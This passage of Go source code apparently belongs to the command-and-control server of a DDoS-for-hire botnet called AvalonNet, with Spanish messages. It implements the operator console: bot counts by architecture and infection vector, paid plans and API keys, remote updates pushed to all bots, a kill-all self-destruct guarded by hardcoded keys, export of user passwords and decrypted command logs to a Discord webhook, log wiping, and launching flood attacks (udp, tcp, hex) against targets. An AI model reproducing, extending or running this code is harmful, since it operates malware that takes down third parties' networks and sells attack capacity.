			this.conn.Write([]byte("\x1b[1;31m  .downloadlogs [webhook]\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .bombkillall [key]         \x1b[38;5;253mTerminate all bots\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .checkuser [username]      \x1b[38;5;253mShow user details\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .update [ip] [prefix] [dir]\x1b[38;5;253mRemote update bots\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .attackstop [key]          \x1b[38;5;253mStop all attacks\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "bots" {
			this.UpdateTitle()
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			botCount := clientList.Count()
			m := clientList.Distribution()
			v := clientList.VectorDistribution()

			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[1;37mAvalonNet Bot Distribution\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;32mTotal Devices: %d \r\n", botCount)))
			this.conn.Write([]byte("\033[0;37m--------------------------\r\n"))
			for arch, count := range m {
				prev := this.lastBotCounts[arch]
				change := count - prev
				changeStr := "[0]"
				if change > 0 {
					changeStr = fmt.Sprintf("\033[1;32m[+%d]\033[1;37m", change)
				} else if change < 0 {
					changeStr = fmt.Sprintf("\033[1;31m[%d]\033[1;37m", change)
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%-10s \033[1;37m%s: %d\r\n", arch, changeStr, count)))
				this.lastBotCounts[arch] = count
			}
			this.conn.Write([]byte("\033[0;37m--------------------------\r\n"))
			this.conn.Write([]byte("\x1b[1;32mTotal Vectores:\r\n"))
			for vector, count := range v {
				prev := this.lastVectorCounts[vector]
				change := count - prev
				changeStr := "[0]"
				if change > 0 {
					changeStr = fmt.Sprintf("\033[1;32m[+%d]\033[1;37m", change)
				} else if change < 0 {
					changeStr = fmt.Sprintf("\033[1;31m[%d]\033[1;37m", change)
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34m%-10s \033[1;37m%s: %d\r\n", vector, changeStr, count)))
				this.lastVectorCounts[vector] = count
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "myinfo" {
			expiryStr := "Nunca"
			if this.user.expiry > 0 {
				expiryStr = time.Unix(this.user.expiry, 0).Format("2006-01-02")
			}
			apiKey, _ := database.GetAPIKey(this.user.username)
			if apiKey == "" {
				apiKey = "Ninguna"
			}
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36muser: \033[1;37m%s\r\n", this.user.username)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mplan: \033[1;37m%s\r\n", this.user.planName)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mexpire: \033[1;37m%s\r\n", expiryStr)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mapikey: \033[1;37m%s\r\n", apiKey)))
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			continue
		}

		if cmd == "apikey" || cmd == "mykey" {
			allowedPlans := map[string]bool{"user": true, "vip": true, "lunar": true, "admin": true}
			if this.user.admin == 0 && !allowedPlans[this.user.planName] {
				this.conn.Write([]byte("\033[91mTu plan no tiene acceso a la API.\r\n"))
				continue
			}

			existingKey, err := database.GetAPIKey(this.user.username)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			if existingKey != "" {
				this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("\033[1;36mYour API Key: \033[1;37m%s\r\n", existingKey)))
				this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			} else {
				newKey, err := database.GenerateAPIKey(this.user.username)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[91mError generando key: %s\r\n", err.Error())))
					continue
				}
				this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("\033[1;32mAPI Key generada: \033[1;37m%s\r\n", newKey)))
				this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			}
			continue
		}

		if cmd == "adduser" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}

			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Plan (lunar, vip, user, free): "))
			plan, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Days: "))
			days_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			days, err := strconv.Atoi(days_str)
			if err != nil {
				continue
			}

			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Plan: " + plan + "\r\n"))
			this.conn.Write([]byte("Days: " + days_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm[y/n]: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}

			if database.CreateUser(new_un, new_pw, plan, days) {
				this.conn.Write([]byte("\033[92mUsuario creado correctamente.\r\n"))
			} else {
				this.conn.Write([]byte("\033[91mError al crear usuario.\r\n"))
			}
			continue
		}

		if cmd == "deluser" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .deluser [user]\r\n"))
				continue
			}
			if database.RemoveUser(parts[1]) {
				this.conn.Write([]byte("\033[92mUsuario eliminado.\r\n"))
			} else {
				this.conn.Write([]byte("\033[91mError al eliminar usuario.\r\n"))
			}
			continue
		}

		if cmd == "checkuser" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .checkuser [username]\r\n"))
				continue
			}
			targetUser := parts[1]

			acc, err := database.GetAccountInfo(targetUser)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			expiryStr := "Nunca"
			if acc.expiry > 0 {
				expiryStr = time.Unix(acc.expiry, 0).Format("2006-01-02")
			}
			apiKey, _ := database.GetAPIKey(acc.username)
			if apiKey == "" {
				apiKey = "Ninguna"
			}

			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36muser: \033[1;37m%s\r\n", acc.username)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mplan: \033[1;37m%s\r\n", acc.planName)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mexpire: \033[1;37m%s\r\n", expiryStr)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mapikey: \033[1;37m%s\r\n", apiKey)))
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			continue
		}

		if cmd == "blacklist" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 3 {
				this.conn.Write([]byte("\033[93mUso: .blacklist [add/del] [ip] [mask]\r\n"))
				continue
			}
			action, ip := parts[1], parts[2]
			mask := 32
			if len(parts) > 3 {
				mask, _ = strconv.Atoi(parts[3])
			}

			if action == "add" {
				if database.AddWhitelist(ip, mask) {
					this.conn.Write([]byte("\033[92mBlacklist actualizado.\r\n"))
				} else {
					this.conn.Write([]byte("\033[91mError al añadir.\r\n"))
				}
			} else if action == "del" {
				if database.RemoveWhitelist(ip, mask) {
					this.conn.Write([]byte("\033[92mIP eliminada de blacklist.\r\n"))
				} else {
					this.conn.Write([]byte("\033[91mError al eliminar.\r\n"))
				}
			}
			continue
		}

		if cmd == "ipinfo" {
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .ipinfo [ip]\r\n"))
				continue
			}
			targetIP := parts[1]

			ipInfo, err := getIPInfo(targetIP, IpInfoTokens)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError al obtener información: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;231m[ \033[38;5;125mIP Information \x1b[38;5;231m]\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mIP \x1b[39m\033[38;5;125m·········· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.IP)))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mASN \x1b[39m\033[38;5;125m········· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.ASN)))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mAS Name \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.ASName)))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mAS Domain \x1b[39m\033[38;5;125m··· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.ASDomain)))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mCountry \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s (%s) \x1b[38;5;231m]\r\n", ipInfo.Country, ipInfo.CountryCode)))
			this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mContinent \x1b[39m\033[38;5;125m··· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s (%s) \x1b[38;5;231m]\r\n", ipInfo.Continent, ipInfo.ContinentCode)))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "remove" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			err := os.Truncate("logs/commands.txt", 0)
			if err != nil {
				this.conn.Write([]byte("\033[91mError al limpiar logs.\r\n"))
			} else {
				this.conn.Write([]byte("\033[92mLogs limpiados correctamente.\r\n"))
			}
			continue
		}

		if cmd == "checkping" {
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .checkping [ip]\r\n"))
				continue
			}
			targetIP := parts[1]

			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mChecking ping to %s...\r\n", targetIP)))
			results, err := CheckPing(targetIP)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n  \x1b[38;5;231m[ \033[38;5;125mPing Results \x1b[38;5;231m]\r\n"))
			for node, result := range results {
				nodeName := strings.Replace(node, ".check-host.net", "", 1)
				this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231m%-20s \x1b[39m\033[38;5;125m→ \x1b[38;5;231m%s, %.3fs, %s\r\n", nodeName, result.Status, result.Time, result.IP)))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "checktcp" {
			if len(parts) < 3 {
				this.conn.Write([]byte("\033[93mUso: .checktcp [ip] [port]\r\n"))
				continue
			}
			targetIP := parts[1]
			port := parts[2]

			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mChecking TCP %s:%s...\r\n", targetIP, port)))
			results, err := CheckTCP(targetIP, port)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n  \x1b[38;5;231m[ \033[38;5;125mTCP Results \x1b[38;5;231m]\r\n"))
			for node, result := range results {
				nodeName := strings.Replace(node, ".check-host.net", "", 1)
				status := "OK"
				if result.Error != "" {
					status = result.Error
				}
				this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231m%-20s \x1b[39m\033[38;5;125m→ \x1b[38;5;231m%s, %.3fs\r\n", nodeName, status, result.Time)))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "checkudp" {
			if len(parts) < 3 {
				this.conn.Write([]byte("\033[93mUso: .checkudp [ip] [port]\r\n"))
				continue
			}
			targetIP := parts[1]
			port := parts[2]

			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mChecking UDP %s:%s...\r\n", targetIP, port)))
			results, err := CheckUDP(targetIP, port)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n  \x1b[38;5;231m[ \033[38;5;125mUDP Results \x1b[38;5;231m]\r\n"))
			for node, result := range results {
				nodeName := strings.Replace(node, ".check-host.net", "", 1)
				status := "OK"
				if result.Error != "" {
					status = result.Error
				}
				this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231m%-20s \x1b[39m\033[38;5;125m→ \x1b[38;5;231m%s, %.3fs\r\n", nodeName, status, result.Time)))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "checkdns" {
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .checkdns [domain]\r\n"))
				continue
			}
			targetDomain := parts[1]

			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mChecking DNS for %s...\r\n", targetDomain)))
			results, err := CheckDNS(targetDomain)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n  \x1b[38;5;231m[ \033[38;5;125mDNS Results \x1b[38;5;231m]\r\n"))
			for node, result := range results {
				nodeName := strings.Replace(node, ".check-host.net", "", 1)
				val := ""
				if result.Error != "" {
					val = result.Error
				} else {
					val = strings.Join(result.A, ", ")
				}
				this.conn.Write([]byte(fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231m%-20s \x1b[39m\033[38;5;125m→ \x1b[38;5;231m%s\r\n", nodeName, val)))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "update" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 4 {
				this.conn.Write([]byte("\033[93mUso: .update [ip] [prefix] [dir]\r\n"))
				this.conn.Write([]byte("\x1b[38;5;231mEjemplo: .update 1.1.1.1 avalon /tmp\r\n"))
				continue
			}
			updateMsg := UpdateMessage{
				IP:     parts[1],
				Prefix: parts[2],
				Dir:    parts[3],
			}
			buf := updateMsg.Build()
			clientList.QueueBuf(buf, -1, "")
			this.conn.Write([]byte("\033[92mComando de actualización enviado a todos los bots.\r\n"))
			continue
		}

		if cmd == "attackstop" || cmd == ".attackstop" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 || parts[1] != "messilovers" {
				this.conn.Write([]byte("\033[91mClave incorrecta!\r\n"))
				continue
			}

			// 0x07 = MSG_TYPE_STOP
			buf := []byte{0x07}
			clientList.QueueBuf(buf, -1, "")
			database.StopAllGlobalAttacks()
			this.conn.Write([]byte("\033[92mAtaques detenidos globalmente.\r\n"))
			continue
		}

		if cmd == "bombkillall" || cmd == ".bombkillall" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .bombkillall [key]\r\n"))
				continue
			}
			if parts[1] != "sdACASDc45" {
				this.conn.Write([]byte("\033[91mClave incorrecta!\r\n"))
				continue
			}

			this.conn.Write([]byte("Confirm[y/n]: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}

			// MSG_TYPE_KILL = 0x06
			buf := []byte{0x06}
			clientList.QueueBuf(buf, -1, "")
			this.conn.Write([]byte("\033[92mOrden de autodestrucción enviada a todos los bots.\r\n"))
			continue
		}

		if cmd == "rules" {
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			this.conn.Write([]byte("\033[1;31m1. No spam attacks\r\n"))
			this.conn.Write([]byte("\033[1;31m2. No Attacks To Any Government Websites.\r\n"))
			this.conn.Write([]byte("\033[1;31m3. No Giving Out The Server IP.\r\n"))
			this.conn.Write([]byte("\033[1;31m4. No Sharing Logins.\r\n"))
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			continue
		}

		if cmd == "stats" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			usersOnline := atomic.LoadInt32(&AdminsOnline)
			botCount := clientList.Count()
			attacksRunning := database.fetchRunningAttacks()

			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mUsers online: \033[1;37m%d\r\n", usersOnline)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mbots: \033[1;37m%d\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mattacks running: \033[1;37m%d\r\n", attacksRunning)))
			this.conn.Write([]byte("\033[1;37m--------------------------\r\n"))
			continue
		}

		if cmd == "going" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}

			attacks, err := database.FetchDetailedActiveAttacks()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			if len(attacks) == 0 {
				this.conn.Write([]byte("\033[93mNo hay ataques activos en este momento.\r\n"))
				continue
			}

			this.conn.Write([]byte("\r\n \x1b[38;5;231m[ \033[38;5;125mActive Attacks \x1b[38;5;231m]\r\n"))
			header := fmt.Sprintf("  \x1b[38;5;125m║ \x1b[38;5;231m%-10s \x1b[38;5;125m║ \x1b[38;5;231m%-12s \x1b[38;5;125m║ \x1b[38;5;231m%-15s \x1b[38;5;125m║ \x1b[38;5;231m%-5s \x1b[38;5;125m║ \x1b[38;5;231m%-6s \x1b[38;5;125m║ \x1b[38;5;231m%-20s \x1b[38;5;125m║\r\n", "Plan", "User", "Target", "Port", "Time", "Org")
			separator := "  \x1b[38;5;125m╠" + strings.Repeat("═", 12) + "╬" + strings.Repeat("═", 14) + "╬" + strings.Repeat("═", 17) + "╬" + strings.Repeat("═", 7) + "╬" + strings.Repeat("═", 8) + "╬" + strings.Repeat("═", 22) + "╣\x1b[0m\r\n"
			top_sep := "  \x1b[38;5;125m╔" + strings.Repeat("═", 12) + "╦" + strings.Repeat("═", 14) + "╦" + strings.Repeat("═", 17) + "╦" + strings.Repeat("═", 7) + "╦" + strings.Repeat("═", 8) + "╦" + strings.Repeat("═", 22) + "╗\x1b[0m\r\n"
			bot_sep := "  \x1b[38;5;125m╚" + strings.Repeat("═", 12) + "╩" + strings.Repeat("═", 14) + "╩" + strings.Repeat("═", 17) + "╩" + strings.Repeat("═", 7) + "╩" + strings.Repeat("═", 8) + "╩" + strings.Repeat("═", 22) + "╝\x1b[0m\r\n"

			this.conn.Write([]byte(top_sep))
			this.conn.Write([]byte(header))
			this.conn.Write([]byte(separator))

			for _, a := range attacks {
				parts := strings.Fields(a.Command)
				target := "Unknown"
				port := "0"
				if len(parts) >= 3 {
					target = parts[1]
					port = parts[2]
				}

				timeLeft := int(a.TimeSent) + a.Duration - int(time.Now().Unix())
				if timeLeft < 0 {
					timeLeft = 0
				}

				// Get Organization info
				org := "Unknown"
				info, err := getIPInfo(target, []string{})
				if err == nil && info != nil {
					org = info.Org
					if len(org) > 20 {
						org = org[:17] + "..."
					}
				}

				planName := a.Plan
				if strings.HasPrefix(planName, "admin_") {
					planName = "admin"
				}

				row := fmt.Sprintf("  \x1b[38;5;125m║ \x1b[38;5;231m%-10s \x1b[38;5;125m║ \x1b[38;5;231m%-12s \x1b[38;5;125m║ \x1b[38;5;231m%-15s \x1b[38;5;125m║ \x1b[38;5;231m%-5s \x1b[38;5;125m║ \x1b[38;5;231m%-6d \x1b[38;5;125m║ \x1b[38;5;231m%-20s \x1b[38;5;125m║\r\n", planName, a.Username, target, port, timeLeft, org)
				this.conn.Write([]byte(row))
			}
			this.conn.Write([]byte(bot_sep))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "downloaderusers" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 3 {
				this.conn.Write([]byte("\033[93mUso: .downloaderusers [webhook] [plan]\r\n"))
				continue
			}
			webhook := parts[1]
			planName := parts[2]

			this.conn.Write([]byte(fmt.Sprintf("\033[1;36mExportando usuarios del plan '%s'...\r\n", planName)))

			users, err := database.GetUsersByPlan(planName)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			if len(users) == 0 {
				this.conn.Write([]byte("\033[93mNo se encontraron usuarios para ese plan.\r\n"))
				continue
			}

			filename := fmt.Sprintf("%s.json", planName)
			file, err := os.Create(filename)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError creando archivo: %s\r\n", err.Error())))
				continue
			}

			for _, user := range users {
				ips := "No IPs"
				if len(user.IPs) > 0 {
					ips = strings.Join(user.IPs, ", ")
				}
				apiStatus := "api: no"
				if user.APIKey != "" {
					apiStatus = fmt.Sprintf("api: si %s", user.APIKey)
				}
				line := fmt.Sprintf("%s %s %s %s %s\n", user.Username, user.Password, user.Plan, ips, apiStatus)
				file.WriteString(line)
			}
			file.Close()

			err = sendToDiscordWebhook(webhook, filename, fmt.Sprintf("User export for plan: %s (%d users)", planName, len(users)))
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError enviando a Discord: %s\r\n", err.Error())))
				os.Remove(filename)
				continue
			}

			os.Remove(filename)
			this.conn.Write([]byte(fmt.Sprintf("\033[92mExportados %d usuarios correctamente!\r\n", len(users))))
			continue
		}

		if cmd == "downloadlogs" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .downloadlogs [webhook]\r\n"))
				continue
			}
			webhook := parts[1]

			this.conn.Write([]byte("\033[1;36mDesencriptando y exportando logs...\r\n"))

			logFile, err := os.Open("logs/commands.log")
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError abriendo logs: %s\r\n", err.Error())))
				continue
			}

			exportFile := "decrypted_logs.txt"
			outFile, err := os.Create(exportFile)
			if err != nil {
				logFile.Close()
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError creando exportación: %s\r\n", err.Error())))
				continue
			}

			// Read and decrypt line by line
			scanner := bufio.NewScanner(logFile)
			count := 0
			for scanner.Scan() {
				decrypted, err := decryptLog(scanner.Text())
				if err == nil {
					outFile.WriteString(decrypted + "\n")
					count++
				}
			}
			logFile.Close()
			outFile.Close()

			if count == 0 {
				os.Remove(exportFile)
				this.conn.Write([]byte("\033[93mNo hay logs para exportar.\r\n"))
				continue
			}

			err = sendToDiscordWebhook(webhook, exportFile, fmt.Sprintf("Command logs export (%d entries)", count))
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError enviando a Discord: %s\r\n", err.Error())))
			} else {
				this.conn.Write([]byte(fmt.Sprintf("\033[92m%d logs enviados correctamente a Discord!\r\n", count)))
			}
			os.Remove(exportFile)
			continue
		}

		if cmd == "deletekey" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .deletekey [key]\r\n"))
				continue
			}
			apiKey := parts[1]

			err := database.DeleteAPIKey(apiKey)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\033[92mAPI key eliminada correctamente.\r\n"))
			continue
		}

		if cmd == "banapi" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[93mUso: .banapi [user]\r\n"))
				continue
			}
			username := parts[1]

			err := database.BanUserAPI(username)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte(fmt.Sprintf("\033[92mUsuario '%s' baneado de la API correctamente.\r\n", username)))
			continue
		}

		if isDotCommand {
			method := cmd
			if this.user.planName == "free" {
				if method != "udp" && method != "tcp" && method != "hex" {
					this.conn.Write([]byte("\033[31;1mTu plan free no permite este metodo!\033[0m\r\n"))
					continue
				}
			}

			if atomic.LoadInt32(&AttacksEnabled) == 0 {
				this.conn.Write([]byte("\033[31;1mAttacks are currently DISABLED globally.\033[0m\r\n"))
				continue
			}

			if database.fetchRunningAttacks() >= MaxGlobalAttacks {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mSlots globales llenos! (Max %d)\r\n", MaxGlobalAttacks)))
				continue
			}

			attack, err := NewAttack(cmdLine, this.user.admin)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				continue
			}

			if this.user.maxTime > 0 && int(attack.Duration) > this.user.maxTime {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mTu plan permite max %d seg.\033[0m\r\n", this.user.maxTime)))
				continue
			}

			if database.ContainsWhitelistedTargets(attack) {
				this.conn.Write([]byte("\033[31;1mTarget en blacklist!\r\n"))
				continue
			}

			buf, err := attack.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				continue
			}

			var targetIPStr string
			ip := make(net.IP, 4)
			binary.BigEndian.PutUint32(ip, attack.TargetIP)
			targetIPStr = ip.String()

			ipInfo, err := getIPInfo(targetIPStr, IpInfoTokens)
			if err != nil {
				ipInfo = &IPInfo{Country: "Unknown", Org: "Unknown", Region: "Unknown"}
			}

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
